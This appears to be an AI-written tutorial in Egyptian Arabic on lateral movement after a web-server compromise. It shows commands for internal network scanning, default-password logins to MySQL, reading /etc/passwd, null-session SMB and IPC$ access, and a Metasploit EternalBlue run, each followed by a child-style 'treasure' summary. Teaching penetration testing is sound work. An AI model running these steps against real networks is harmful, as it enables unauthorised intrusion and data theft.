تمام، هشرحلك القسم ده: **"Expanding Access Post-Web Exploitation - Discovering and Exploiting Internal Services"** بنفس الطريقة السابقة: شرح عميق وبسيط مع تركيز على الجانب العملي بأوامر وأكواد، خلاصة بعد كل جزء كأني بكلم طفل، وفي النهاية خطوات عملية للـ Pentesting. يلا نبدأ! 🚀

---

### **1. إيه هو Expanding Access Post-Web Exploitation؟ 🌐**
"Expanding Access Post-Web Exploitation" يعني "توسيع الوصول بعد استغلال الويب". لما تخترق موقع ويب أو سيرفر ويب (بطريقة قانونية في الـ Pentesting)، ما تكتفيش بإنك داخل السيرفر ده بس. الهدف إنك تستخدمه كـ "نقطة بداية" عشان تكتشف وتستغل أنظمة أو خدمات تانية في الشبكة الداخلية.

#### **الجانب العملي:**
- **أمر للتأكد إنك داخل السيرفر:**
  - في لينكس: `whoami`
    - خرج مثال: `www-data` → أنت داخل سيرفر الويب.
  - في ويندوز: `whoami`
    - خرج مثال: `iis apppool\defaultapppool` → أنت في سيرفر IIS.

- **فكرة أساسية:** بعد ما تدخل السيرفر، بتحاول تكتشف خدمات داخلية وتستغلها.

**خلاصة للطفل:** زي لما تدخل غرفة صغيرة في بيت اللعب 🎪، وتبدأ تدور على ألعاب وكنوز مخفية في الغرف التانية! 🎲💰

---

### **2. إيه يعني Discovering and Exploiting Internal Services؟ 🔍**
"Discovering and Exploiting Internal Services" يعني "اكتشاف واستغلال الخدمات الداخلية". الخدمات الداخلية هي برامج أو تطبيقات شغالة على أجهزة في الشبكة الداخلية (زي قواعد بيانات، RDP، أو SMB) اللي ما تقدرش توصلها من برا مباشرة. بتكتشفها من السيرفر المخترق وتحاول تستغلها عشان تاخد تحكم أكبر.

#### **الجانب العملي:**
- **أمر لاكتشاف الشبكة:**
  - في لينكس: `ip addr`
    - خرج مثال: `192.168.1.10` → عنوان السيرفر.
  - في ويندوز: `ipconfig`
    - خرج مثال: `IPv4 Address: 192.168.1.10`.

- **اكتشاف المنافذ:**
  - في لينكس: `netstat -tuln`
    - خرج مثال: `tcp 0 0 192.168.1.10:3306` → قاعدة بيانات MySQL.
  - في ويندوز: `netstat -ano`
    - خرج مثال: `TCP 192.168.1.10:445`.

- **الهدف:** تكتشف الخدمات دي وتستغلها لو فيها ضعف.

**خلاصة للطفل:** زي لما تفتش في بيت اللعب وتلاقي ألعاب سرية مخبية 🎮، وتبدأ تلعب بيها عشان تكسب المزيد من الحلويات! 🍭

---

### **3. Discovering and Exploiting Internal Services في التفصيل؟ 🛠️**
لما تخترق سيرفر ويب، بتبدأ تكتشف الخدمات الداخلية (زي MySQL، SMB، RDP) اللي شغالة على نفس السيرفر أو أجهزة تانية في الشبكة. بعدين بتحاول تستغلها لو فيها ثغرات.

#### **الجانب العملي:**
- **اكتشاف الخدمات:**
  - **في لينكس:**
    ```bash
    netstat -tuln
    ```
    - خرج مثال: `tcp 0 0 0.0.0.0:22` → SSH مفتوح.
    ```bash
    ps aux | grep mysql
    ```
    - خرج مثال: `/usr/sbin/mysqld` → MySQL شغال.

  - **في ويندوز:**
    ```cmd
    netstat -ano
    ```
    - خرج مثال: `TCP 0.0.0.0:3389` → RDP مفتوح.
    ```cmd
    tasklist | findstr "sql"
    ```
    - خرج مثال: `sqlservr.exe` → SQL Server شغال.

- **فحص الشبكة الداخلية:**
  - في لينكس:
    ```bash
    nmap -sT 192.168.1.0/24
    ```
    - خرج مثال: `192.168.1.11:445 open` → SMB مفتوح.
  - في ويندوز:
    ```cmd
    for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i
    ```

#### **استغلال الخدمات:**
- **MySQL (لينكس):**
  - لو لقيت MySQL شغال:
    ```bash
    mysql -u root -p
    ```
    - جرب باسوورد افتراضي (زي `root` أو فاضي).
  - لو نجحت:
    ```sql
    SELECT LOAD_FILE('/etc/passwd');
    ```
    - بيطلعلك ملفات حساسة.

- **SMB (ويندوز/لينكس):**
  - لو لقيت 445 مفتوح:
    ```bash
    smbclient -L 192.168.1.11
    ```
    - خرج مثال: `Sharename: DATA`.
  - اتصل:
    ```bash
    smbclient //192.168.1.11/DATA
    ```
    - لو مفتوح بدون باسوورد، بتقدر تاخد ملفات.

- **RDP (ويندوز):**
  - لو لقيت 3389 مفتوح:
    ```cmd
    net use \\192.168.1.11\IPC$ /user:administrator ""
    ```
    - لو نجح، جرب:
    ```cmd
    rdesktop 192.168.1.11
    ```

- **ليه بيحصل الضعف؟**
  - الخدمات الداخلية بتكون مفتوحة بدون حماية (باسووردات ضعيفة أو Firewall مفقود).
  - السيرفر المخترق بيكون متصل بالخدمات دي.

**خلاصة للطفل:** زي لما تكتشف ألعاب سرية في بيت اللعب 🎮، وتستخدمها عشان تفتح صناديق الكنز وتاخد كل الحلويات! 💰🍭

---

### **4. إزاي تستغل ده في الـ Pentesting؟ ⚒️**
في الـ Pentesting، بعد ما تخترق سيرفر ويب، بتكتشف الخدمات الداخلية وتستغلها عشان تاخد تحكم أكبر في الشبكة وتبلغ عن المشاكل.

#### **الجانب العملي:**
- **فحص الشبكة:**
  ```bash
  nmap -sV 192.168.1.0/24
  ```
  - بيعرفك الخدمات (مثلاً MySQL، SMB).

- **استغلال MySQL:**
  ```bash
  mysql -h 192.168.1.11 -u root -p
  ```
  - لو دخلت، نفذ:
    ```sql
    SHOW DATABASES;
    ```

- **استغلال SMB:**
  ```bash
  crackmapexec smb 192.168.1.11 -u "" -p ""
  ```
  - لو نجح، جرب:
    ```bash
    smbmap -H 192.168.1.11
    ```

- **استغلال بـ Metasploit:**
  ```
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST 192.168.1.11
  run
  ```

**خلاصة للطفل:** زي لما تستخدم مفتاح سحري في بيت اللعب 🗝️، وتفتح ألعاب سرية عشان تكسب كل الكنوز! ✨

---

### **خطوات عملية للـ Pentesting في Expanding Access 🛠️**
دلوقتي خطوات عملية للاستغلال في اختبار الاختراق الأخلاقي:

#### **في لينكس (سيرفر ويب):**
1. **تحقق من وصولك:**
   ```bash
   whoami
   ip addr
   ```
   - خرج مثال: `www-data`, `192.168.1.10`.

2. **اكتشف الخدمات:**
   ```bash
   netstat -tuln
   nmap -sT 192.168.1.0/24
   ```

3. **استغل MySQL:**
   - لو لقيت 3306 مفتوح:
     ```bash
     mysql -h 192.168.1.11 -u root -p
     ```
     - جرب باسوورد فاضي أو `root`.

4. **استغل SMB:**
   ```bash
   smbclient -L 192.168.1.11
   smbclient //192.168.1.11/DATA
   ```

5. **هاجم بـ Metasploit:**
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.11
   run
   ```

#### **في ويندوز (سيرفر ويب):**
1. **تحقق من وصولك:**
   ```cmd
   whoami
   ipconfig
   ```

2. **اكتشف الخدمات:**
   ```cmd
   netstat -ano
   for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i
   ```

3. **استغل RDP:**
   - لو لقيت 3389:
     ```cmd
     net use \\192.168.1.11\IPC$ /user:administrator ""
     rdesktop 192.168.1.11
     ```

4. **استغل SMB:**
   ```cmd
   net view \\192.168.1.11
   net use Z: \\192.168.1.11\DATA
   ```

5. **هاجم بـ Metasploit:**
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.11
   run
   ```

**ملاحظة:** كل الأوامر دي لازم تتعمل بإذن قانوني في بيئة اختبار! ⚖️

---

### **الخلاصة النهائية 😊**
Expanding Access يعني تكتشف وتستغل خدمات داخلية بعد اختراق سيرفر ويب. استخدمنا أوامر زي `netstat` و`nmap` وأدوات زي Metasploit عشان نلاقي ونهاجم الخدمات دي.

**خلاصة للطفل:** زي لما تفتش في بيت اللعب وتلاقي ألعاب سرية 🎮، وتستخدم مفتاح سحري عشان تفتحها وتاخد كل الحلويات! 👑🍭